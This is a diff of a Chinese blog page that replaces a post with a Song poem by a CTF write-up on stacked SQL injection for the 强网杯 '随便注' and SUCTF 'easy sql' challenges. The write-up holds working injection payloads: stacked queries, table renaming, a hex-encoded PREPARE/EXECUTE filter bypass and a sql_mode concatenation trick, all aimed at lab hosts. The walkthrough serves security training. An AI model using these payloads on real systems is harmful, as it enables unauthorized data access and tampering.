@@ -4,8 +4,12 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="《玉楼春》, 舞动的獾">
-    <meta name="description" content="玉楼春·春景&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;">
+    <meta name="keywords" content="堆叠注入, 舞动的獾">
+    <meta name="description" content="强网杯随便注http://5bd04c33-fbd9-47fb-a7ee-481b9c0b1324.node3.buuoj.cn/?inject=1&#39;order by 3%23
+
+首先测试order by 3，发现没有三列
+
+尝试order">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -13,7 +17,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>《玉楼春》 | 舞动的獾</title>
+    <title>堆叠注入 | 舞动的獾</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -259,13 +263,13 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/13.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/23.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        《玉楼春》
+                        堆叠注入
                     </div>
                 </div>
             </div>
@@ -376,12 +380,12 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/文学/" target="_blank">
-                                <span class="chip bg-color">文学</span>
+                            <a href="/tags/ctf/" target="_blank">
+                                <span class="chip bg-color">ctf</span>
                             </a>
                         
-                            <a href="/tags/宋词/" target="_blank">
-                                <span class="chip bg-color">宋词</span>
+                            <a href="/tags/堆叠注入/" target="_blank">
+                                <span class="chip bg-color">堆叠注入</span>
                             </a>
                         
                     </div>
@@ -395,21 +399,21 @@
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2019-04-06
+                    2019-11-09
                 </div>
 
                 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        94
+                        914
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        1 分
+                        3 分
                     </div>
                     
                 
@@ -425,11 +429,82 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="玉楼春·春景"><a href="#玉楼春·春景" class="headerlink" title="玉楼春·春景"></a><center>玉楼春·春景</center></h1><p><center frontsize="14">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>北宋 &nbsp;宋祁</strong></center></p>
-<p><center><h2><em>东城渐觉风光好，縠皱波纹迎客棹。</em></h2></center></p>
-<p><center><h2><em>绿杨烟外晓寒轻，红杏枝头春意闹。</em></h2></center></p>
-<p><center><h2><em>浮生长恨欢娱少，肯爱千金轻一笑。</em></h2></center></p>
-<p><center><h2><em>为君持酒劝斜阳，且向花间留晚照。</em></h2><center><br><img src="https://img-blog.csdnimg.cn/20190407101849224.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1l1X2NzZG5zdG9yeQ==,size_16,color_FFFFFF,t_70" alt=""></center></center></p>
+                <h3 id="强网杯随便注"><a href="#强网杯随便注" class="headerlink" title="强网杯随便注"></a>强网杯随便注</h3><pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//5bd04c33-fbd9-47fb-a7ee-481b9c0b1324.node3.buuoj.cn/?inject=1'order by 3%23</span>
+</code></pre>
+<p>首先测试order by 3，发现没有三列</p>
+<img src="/2019/11/09/dui-die-zhu-ru/2.png">
+<p>尝试<code>order by 2</code>,回显正常</p>
+<p>尝试使用联合查询</p>
+<pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//5bd04c33-fbd9-47fb-a7ee-481b9c0b1324.node3.buuoj.cn/?inject=1'union select 1,database()%23</span>
+</code></pre>
+<p>发现显示了过滤机制</p>
+<img src="/2019/11/09/dui-die-zhu-ru/3.png">
+<p>过滤了select，这对注入操作难了不少，直接注入估计十分困难</p>
+<p>这时候考虑堆叠注入，语句以分号结尾，就好像是mysql语句中的；的分割，尝试堆叠注入。</p>
+<pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//5bd04c33-fbd9-47fb-a7ee-481b9c0b1324.node3.buuoj.cn/?inject=1';show tables%23</span>
+</code></pre>
+<p>发现了两张表，分别为<code>words</code>和<code>1919810931114514</code></p>
+<p>用show语句对words先进行查询</p>
+<pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//5bd04c33-fbd9-47fb-a7ee-481b9c0b1324.node3.buuoj.cn/?inject=1';show columns from words%23</span>
+</code></pre>
+<p>发现存在id和data字段，猜测默认查询的数据库就是words了</p>
+<img src="/2019/11/09/dui-die-zhu-ru/4.png">
+<p>查询<code>1919810931114514</code>表</p>
+<p>注意，查询表名全为数字的表时，要加反引号</p>
+<pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//5bd04c33-fbd9-47fb-a7ee-481b9c0b1324.node3.buuoj.cn/?inject=1';show columns from `1919810931114514`%23</span>
+</code></pre>
+<img src="/2019/11/09/dui-die-zhu-ru/5.png">
+<p>flag在1919810931114514的表中，默认查询为words表中的字段，联合查询的语句被过滤，但是并没有过滤rename1和alert,我们可以对words表进行改名为其他，然后flag所在的表改为words，在表中添加id字段，将flag改名为data,再次查询，得到结果。</p>
+<hr>
+<p>1.将words表改名为word1或其它任意名字</p>
+<p>2.1919810931114514改名为words</p>
+<p>3.将新的word表插入一列，列名为id</p>
+<p>4.将flag列改名为data</p>
+<hr>
+<p>构造payload:</p>
+<pre class=" language-sql"><code class="language-sql">?inject<span class="token operator">=</span><span class="token number">1</span>'<span class="token punctuation">;</span><span class="token keyword">alter</span> <span class="token keyword">table</span> words <span class="token keyword">rename</span> <span class="token keyword">to</span> word<span class="token punctuation">;</span><span class="token keyword">alter</span> <span class="token keyword">table</span><span class="token punctuation">`</span><span class="token number">1919810931114514</span><span class="token punctuation">`</span> <span class="token keyword">rename</span> <span class="token keyword">to</span> words<span class="token punctuation">;</span><span class="token keyword">alter</span> <span class="token keyword">table</span> words change flag <span class="token keyword">data</span> <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">alter</span> <span class="token keyword">table</span> words <span class="token keyword">add</span> <span class="token keyword">column</span> id <span class="token keyword">int</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token keyword">default</span> <span class="token number">1</span> <span class="token comment" spellcheck="true">--+</span>
+</code></pre>
+<p>直接查询1,得到flag</p>
+<img src="/2019/11/09/dui-die-zhu-ru/6.png">
+<p>或者：</p>
+<pre class=" language-sql"><code class="language-sql">?inject<span class="token operator">=</span><span class="token number">1</span>'<span class="token punctuation">;</span><span class="token keyword">RENAME</span> <span class="token keyword">TABLE</span> <span class="token punctuation">`</span>words<span class="token punctuation">`</span> <span class="token keyword">TO</span> <span class="token punctuation">`</span>words1<span class="token punctuation">`</span><span class="token punctuation">;</span><span class="token keyword">RENAME</span> <span class="token keyword">TABLE</span> <span class="token punctuation">`</span><span class="token number">1919810931114514</span><span class="token punctuation">`</span> <span class="token keyword">TO</span> <span class="token punctuation">`</span>words<span class="token punctuation">`</span><span class="token punctuation">;</span><span class="token keyword">ALTER</span> <span class="token keyword">TABLE</span> <span class="token punctuation">`</span>words<span class="token punctuation">`</span> CHANGE <span class="token punctuation">`</span>flag<span class="token punctuation">`</span> <span class="token punctuation">`</span>id<span class="token punctuation">`</span> <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span> <span class="token keyword">CHARACTER SET</span> utf8 <span class="token keyword">COLLATE</span> utf8_general_ci <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">;</span><span class="token keyword">show</span> <span class="token keyword">columns</span> <span class="token keyword">from</span> words<span class="token punctuation">;</span><span class="token comment" spellcheck="true">#</span>
+</code></pre>
+<p>查询1’or 1=1%23</p>
+<p>得到flag,但是这个payload 并不太懂，先记录一下</p>
+<p><strong>还有个注法：</strong></p>
+<p>大佬wp展示了一手存储过程绕过</p>
+<pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//web16.buuoj.cn/?inject=1%27;SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare%20execsql%20from%20@a;execute%20execsql;#</span>
+使用了大小写绕过strstr<span class="token punctuation">(</span>$inject<span class="token punctuation">,</span> <span class="token string">"set"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> strstr<span class="token punctuation">(</span>$inject<span class="token punctuation">,</span> <span class="token string">"prepare"</span><span class="token punctuation">)</span>
+去掉URL编码后?inject<span class="token operator">=</span><span class="token number">1</span>'<span class="token punctuation">;</span><span class="token keyword">SeT</span><span class="token variable">@a</span><span class="token operator">=</span><span class="token number">0x73656c656374202a2066726f6d20603139313938313039333131313435313460</span><span class="token punctuation">;</span>prepare execsql <span class="token keyword">from</span> <span class="token variable">@a</span><span class="token punctuation">;</span><span class="token keyword">execute</span> execsql<span class="token punctuation">;</span><span class="token comment" spellcheck="true">#</span>
+</code></pre>
+<p>PREPARE语句准备好一条SQL语句，并分配给这条SQL语句一个名字供之后调用。准备好的SQL语句通过EXECUTE命令执行，通过DEALLOCATE PREPARE命令释放掉。</p>
+<p>hex(select * from `1919810931114514`)=</p>
+<p>0x73656c656374202a2066726f6d20603139313938313039333131313435313460</p>
+<h3 id="suctf-easy-sql"><a href="#suctf-easy-sql" class="headerlink" title="suctf easy sql"></a>suctf easy sql</h3><p>这次打开题目，发现这次是post注入，输入1看看。</p>
+<img src="/2019/11/09/dui-die-zhu-ru/7.png">
+<p>检验发现会出现三种结果</p>
+<hr>
+<ol>
+<li>Nonono.</li>
+<li>空</li>
+<li>出现array,回显</li>
+</ol>
+<hr>
+<p>当出现被过滤字符时，就会出现出现Nonono,测试被过滤的有or ,from, union, updatexml, extractvalue,where ,if等</p>
+<p>测试堆叠注入</p>
+<pre class=" language-sql"><code class="language-sql">query<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">show</span> <span class="token keyword">tables</span><span class="token operator">%</span><span class="token number">23</span>
+</code></pre>
+<img src="/2019/11/09/dui-die-zhu-ru/8.png">
+<p>  发现了Flag表，select查询表名几乎不可能，过滤了太多当前库只有一个Flag表，而且语句长度限制了40位，所以想要像强网一样的改表面和预编译的操作都不可以了，并且过滤了from等等</p>
+<p>猜测有flag字段，因为flag被过滤了，不能对它进行改名操作了</p>
+<p>预期解：</p>
+<p>通过堆叠注入sql_mode的值为PIPES_AS_CONCAT，设置sql_mode为PIPES_AS_CONCAT后可改变’||’的含义为连接字符串，在oracle 缺省支持 通过 ‘ || ’ 来实现字符串拼接，但在mysql 缺省不支持。需要调整mysql 的sql_mode 模式：pipes_as_concat 来实现oracle 的一些功能</p>
+<p>改变语义后就是将前一个字段的查询结果和后一个字段查询结果进行拼接。这样两个字段都会被查询<br>构造payload：<br><code>1;set sql_mode=PIPES_AS_CONCAT;select 1</code></p>
+<img src="/2019/11/09/dui-die-zhu-ru/9.png">
+<p>非预期解</p>
+<p>输入*,1</p>
+<p>原sql语句变为<br><code>select *,1||flag from Flag</code></p>
+<p>也能得到flag</p>
 
             </div>
             <hr/>
@@ -577,7 +652,7 @@
                     </span>
                     <a href="https://yubin0617.github.io" class="b-link-green">舞动的獾</a>
                     <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
-                    <a href="/2019/04/06/yu-lou-chun/" class="b-link-green">《玉楼春》</a>
+                    <a href="/2019/11/09/dui-die-zhu-ru/" class="b-link-green">堆叠注入</a>
                 </p>
             </div>
         </div>
@@ -598,35 +673,30 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="fa fa-dot-circle-o"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2019/10/18/test2/">
+                <a href="/2019/11/09/dui-die-zhu-ru/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="test2">
+                        <img src="/medias/featureimages/23.jpg" class="responsive-img" alt="堆叠注入">
                         
-                        <span class="card-title">test2</span>
+                        <span class="card-title">堆叠注入</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
-                    <div class="summary">
-#include&lt;iostream>
-using namespace std;
-int main(){
-    printf("hello hello");
-    return 0;
-}
+                    <div class="summary">强网杯随便注http://5bd04c33-fbd9-47fb-a7ee-481b9c0b1324.node3.buuoj.cn/?inject=1'order by 3%23
 
+首先测试order by 3，发现没有三列
 
-&lt;?php
-echo "hell</div>
+尝试order</div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2019-10-18
-                        </span>
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-11-09
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-user fa-fw"></i>
@@ -635,15 +705,16 @@ echo "hell</div>
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/图片测试/" target="_blank">
-                        <span class="chip bg-color">图片测试</span>
+                    <a href="/tags/ctf/" target="_blank">
+                        <span class="chip bg-color">ctf</span>
                     </a>
                     
-                    <a href="/tags/代码测试/" target="_blank">
-                        <span class="chip bg-color">代码测试</span>
+                    <a href="/tags/堆叠注入/" target="_blank">
+                        <span class="chip bg-color">堆叠注入</span>
                     </a>
                     
                 </div>
@@ -657,20 +728,26 @@ echo "hell</div>
                 下一篇&nbsp;<i class="fa fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2018/09/20/ni-hao-hexo/">
+                <a href="/2019/11/07/qian-chang-ssti/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="你好!hexo">
+                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="浅尝ssti">
                         
-                        <span class="card-title">你好!hexo</span>
+                        <span class="card-title">浅尝ssti</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
-                    <div class="summary"></div>
+                    <div class="summary">
+easy_tornado进入题目，发现了三个文件目录
+
+点开flag.txt显示的是文件的路径是/fllllllllllllag
+
+点开welcome.txt,发现了render，说明这个网页的框架使用的是render函数
+render是</div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2018-09-20
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-11-07
                             </span>
                         <span class="publish-author">
                             
@@ -679,6 +756,18 @@ echo "hell</div>
                             
                         </span>
                     </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/ctf/" target="_blank">
+                        <span class="chip bg-color">ctf</span>
+                    </a>
+                    
+                    <a href="/tags/ssti/" target="_blank">
+                        <span class="chip bg-color">ssti</span>
+                    </a>
+                    
                 </div>
                 
             </div>
